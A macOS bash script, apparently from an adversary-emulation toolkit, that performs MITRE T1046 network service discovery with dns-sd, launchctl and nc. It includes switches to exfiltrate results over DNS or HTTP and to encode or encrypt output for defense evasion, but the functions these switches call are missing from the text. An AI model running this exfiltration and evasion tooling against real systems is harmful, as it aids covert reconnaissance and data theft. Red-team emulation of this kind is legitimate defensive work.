
# Script Name: network_service.sh
# MITRE ATT&CK Technique: T1046 - Network Service Discovery
# Tactic: Discovery
# Platform: macOS

# Author: @darmado x.com/darmad0
# Date: $(date +%Y-%m-%d)
# Version: 1.1

# Description:
# This script performs network service discovery on macOS systems using native commands.
# It identifies applications and services that are listening on system ports.
# The script focuses on discovering network services, their states, and configurations.

# References:
# - https://attack.mitre.org/techniques/T1046/
# - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md

# MITRE ATT&CK Reference var map
TACTIC="Discovery"
TTP_ID="T1046"

TACTIC_EXFIL="Exfiltration"
TTP_ID_EXFIL="T1011"

TACTIC_ENCRYPT="Defense Evasion"
TTP_ID_ENCRYPT="T1027"

TACTIC_ENCODE="Defense Evasion"
TTP_ID_ENCODE="T1140"

TTP_ID_ENCODE_BASE64="T1027.001"
TTP_ID_ENCODE_STEGANOGRAPHY="T1027.003"
TTP_ID_ENCODE_PERL="T1059.006"

# Script metadata 
NAME="network_service"

# Global Control Switches
SUDO_MODE=false
VERBOSE=false
DEBUG=false
ALL=false

# Output Control Switches
LOG_ENABLED=false
ENCODE="none"
ENCRYPT="none"
OUTPUT_JSON=false

# Exfiltration Control Switches
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""

# Security Check Switches
CHECK_EDR=false
CHECK_AV=false
CHECK_FIREWALL=false
CHECK_MRT=false
CHECK_GATEKEEPER=false
CHECK_XPROTECT=false
CHECK_TCC=false
CHECK_OST=false
CHECK_HIDS=false

# Logging Configuration
LOG_DIR="../../logs"
LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
LOG_FILE="${LOG_DIR}/${LOG_FILE_NAME}"

# Input Variables with Defaults
INPUT_PROTOCOL=""
INPUT_PORT=""
INPUT_SERVICE=""
INPUT_INTERFACE=""
INPUT_TIMEOUT=10
INPUT_RATE_LIMIT=0.5
INPUT_MAX_DEPTH=5
INPUT_FILTER=""
INPUT_FORMAT="raw"

# Command Variables (use full paths for critical commands)
CMD_NETSTAT="/usr/sbin/netstat"
CMD_LSOF="/usr/sbin/lsof"
CMD_NC="/usr/bin/nc"
CMD_LAUNCHCTL="/bin/launchctl"
CMD_SCUTIL="/usr/sbin/scutil"
CMD_NETWORKSETUP="/usr/sbin/networksetup"
CMD_SYSCTL="/usr/sbin/sysctl"
CMD_FS_USAGE="/usr/bin/fs_usage"
CMD_PROC_INFO="/usr/sbin/proc_info"
CMD_SYSTEM_PROFILER="/usr/sbin/system_profiler"
CMD_ROUTE="/sbin/route"
CMD_ARP="/usr/sbin/arp"
CMD_NETTOP="/usr/bin/nettop"
CMD_DNSSD="/usr/bin/dns-sd"
CMD_MDNSRESPONDER="/usr/sbin/mDNSResponder"
CMD_AVAHI="/usr/local/bin/avahi-browse"
CMD_MDFIND="/usr/bin/mdfind"
CMD_SHARING="/usr/sbin/sharing"
CMD_DISCOVERYD="/usr/libexec/discoveryd"
CMD_AIRPORT="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
CMD_NETWORKQUALITY="/usr/bin/networkQuality"
CMD_IPCONFIG="/usr/sbin/ipconfig"
CMD_DEFAULTS="/usr/bin/defaults"
CMD_PLUTIL="/usr/bin/plutil"
CMD_SECURITY="/usr/bin/security"
CMD_DTRACE="/usr/sbin/dtrace"
CMD_VMMAP="/usr/bin/vmmap"
CMD_HEAP="/usr/bin/heap"
CMD_DTRUSS="/usr/bin/dtruss"

# Utility Functions

#FunctionType: utility
validate_sudo_mode() {
    if [ "$SUDO_MODE" = true ] && [ "$(id -u)" != "0" ]; then
        echo "Error: Root privileges required. Please run with sudo." >&2
        return 1
    fi
    return 0
}

#FunctionType: utility
validate_input() {
    local input="$1"
    local input_type="$2"
    
    case "$input_type" in
        "port")
            if ! [[ "$input" =~ ^[0-9]+$ ]] || [ "$input" -lt 1 ] || [ "$input" -gt 65535 ]; then
                log_to_stdout "Invalid port number: $input" "validate_input" ""
                return 1
            fi
            ;;
        "protocol")
            if ! [[ "$input" =~ ^(tcp|udp|all)$ ]]; then
                log_to_stdout "Invalid protocol: $input" "validate_input" ""
                return 1
            fi
            ;;
        "service")
            if ! [[ "$input" =~ ^[a-zA-Z0-9_-]+$ ]]; then
                log_to_stdout "Invalid service name: $input" "validate_input" ""
                return 1
            fi
            ;;
    esac
    return 0
}

#FunctionType: utility
get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

#FunctionType: utility
log_to_stdout() {
    local msg="$1"
    local function_name="$2"
    local command="$3"
    local timestamp=$(get_timestamp)
    local log_entry="[${timestamp}]: user: $USER; ttp_id: $TTP_ID; tactic: $TACTIC; msg: $msg; function: $function_name; command: \"$command\""
    
    echo "$log_entry"
    
    if [ "$LOG_ENABLED" = true ]; then
        echo "$log_entry" >> "$LOG_FILE"
    fi
}

#FunctionType: utility
create_log() {
    if [ ! -d "$LOG_DIR" ]; then
        mkdir -p "$LOG_DIR"
    fi
    touch "$LOG_FILE"
    chmod 600 "$LOG_FILE"
}

#FunctionType: utility
log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    
    if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        create_log
    fi
    
    echo "$output" >> "$LOG_FILE"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        mv "$LOG_FILE" "${LOG_FILE}.old"
        create_log
    fi
}

#FunctionType: utility
rate_limit() {
    sleep "$INPUT_RATE_LIMIT"
}

#FunctionType: utility
isolate_process() {
    local cmd="$1"
    local timeout="${2:-$INPUT_TIMEOUT}"
    
    # Run command in background with timeout
    timeout "$timeout" bash -c "$cmd" &
    local pid=$!
    
    # Wait for completion or timeout
    wait "$pid" 2>/dev/null || {
        kill -9 "$pid" 2>/dev/null
        log_to_stdout "Command timed out: $cmd" "isolate_process" "$cmd"
        return 1
    }
}

#FunctionType: discovery
discover_bonjour_services() {
    local service_types=(
        "_ssh._tcp"
        "_afpovertcp._tcp"
        "_smb._tcp"
        "_printer._tcp"
        "_ipp._tcp"
        "_http._tcp"
        "_https._tcp"
        "_rdp._tcp"
        "_sftp-ssh._tcp"
        "_webdav._tcp"
        "_companion-link._tcp"
        "_device-info._tcp"
        "_workstation._tcp"
        "_adisk._tcp"
    )
    
    local output=""
    
    for service in "${service_types[@]}"; do
        log_to_stdout "Discovering $service" "discover_bonjour_services" "$CMD_DNSSD -B $service"
        output+="$($CMD_DNSSD -B "$service" . & sleep "${INPUT_TIMEOUT:-2}"; kill $!)\n"
        rate_limit
    done

    log_to_stdout "Getting mDNS status" "discover_bonjour_services" "ps aux | grep mDNSResponder"
    output+="$(ps aux | grep mDNSResponder | grep -v grep)\n"
    
    if [ "$SUDO_MODE" = true ]; then
        log_to_stdout "Requesting mDNSResponder info" "discover_bonjour_services" "sudo killall -INFO mDNSResponder"
        output+="$(sudo killall -INFO mDNSResponder 2>/dev/null)\n"
    fi

    echo -e "$output"
}

#FunctionType: discovery
discover_network_services() {
    local output=""

    log_to_stdout "Discovering network services" "discover_network_services" "$CMD_LAUNCHCTL list"
    output+="$($CMD_LAUNCHCTL list | grep -i "net\|web\|ftp\|ssh\|smb\|afp")\n"
    
    log_to_stdout "Getting network service states" "discover_network_services" "$CMD_SCUTIL --nc list"
    output+="$($CMD_SCUTIL --nc list)\n"

    if [ -n "$INPUT_PORT" ]; then
        if validate_input "$INPUT_PORT" "port"; then
            log_to_stdout "Scanning port $INPUT_PORT" "discover_network_services" "$CMD_NC -w $INPUT_TIMEOUT localhost $INPUT_PORT"
            output+="$(echo "" | $CMD_NC -w "${INPUT_TIMEOUT:-3}" localhost "$INPUT_PORT")\n"
        fi
    fi

    echo -e "$output"
}

# Main function
main() {
    # Validate sudo mode first if required
    if ! validate_sudo_mode; then
        exit 1
    fi

    # Initialize logging if enabled
    if [ "$LOG_ENABLED" = true ]; then
        create_log
    fi

    local output=""
    local processed_output=""

    # Execute discovery functions based on switches
    if [ "$ALL" = true ]; then
        output+="$(discover_bonjour_services)\n"
        output+="$(discover_network_services)\n"
    else
        if [ -n "$INPUT_SERVICE" ]; then
            output+="$(discover_bonjour_services)\n"
        fi
        if [ -n "$INPUT_PORT" ] || [ -n "$INPUT_PROTOCOL" ]; then
            output+="$(discover_network_services)\n"
        fi
    fi

    # Process output
    if [ "$ENCODE" != "none" ]; then
        processed_output=$(encode_output "$output")
    fi

    if [ "$ENCRYPT" != "none" ]; then
        processed_output=$(encrypt_output "${processed_output:-$output}")
    fi

    # Handle output based on settings
    if [ "$LOG_ENABLED" = true ]; then
        log_output "${processed_output:-$output}"
    fi

    if [ "$EXFIL" = true ]; then
        if [ "$EXFIL_METHOD" = "dns" ]; then
            exfiltrate_dns "${processed_output:-$output}" "$EXFIL_URI"
        else
            exfiltrate_http "${processed_output:-$output}" "$EXFIL_URI"
        fi
    else
        echo "${processed_output:-$output}"
    fi
}

# Parse command line arguments
while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help) display_help; exit 0 ;;
        -v|--verbose) VERBOSE=true ;;
        -d|--debug) DEBUG=true ;;
        -l|--log) LOG_ENABLED=true ;;
        -a|--all) ALL=true ;;
        --sudo) SUDO_MODE=true ;;
        -j|--json) OUTPUT_JSON=true ;;
        -e|--encode)
            shift
            ENCODE="$1"
            ;;
        -E|--encrypt)
            shift
            ENCRYPT="$1"
            ENCRYPT_KEY=$($CMD_OPENSSL rand -base64 32)
            ;;
        --exfil=*)
            EXFIL=true
            EXFIL_URI="${1#*=}"
            if [[ "$EXFIL_URI" == dns=* ]]; then
                EXFIL_METHOD="dns"
                EXFIL_URI="${EXFIL_URI#dns=}"
            else
                EXFIL_METHOD="http"
            fi
            ;;
        -c|--chunksize)
            shift
            INPUT_CHUNK_SIZE="$1"
            ;;
        --port=*)
            INPUT_PORT="${1#*=}"
            ;;
        --protocol=*)
            INPUT_PROTOCOL="${1#*=}"
            ;;
        --service=*)
            INPUT_SERVICE="${1#*=}"
            ;;
        --interface=*)
            INPUT_INTERFACE="${1#*=}"
            ;;
        *) echo "Unknown option: $1" >&2; display_help; exit 1 ;;
    esac
    shift
done

# Execute main function
main 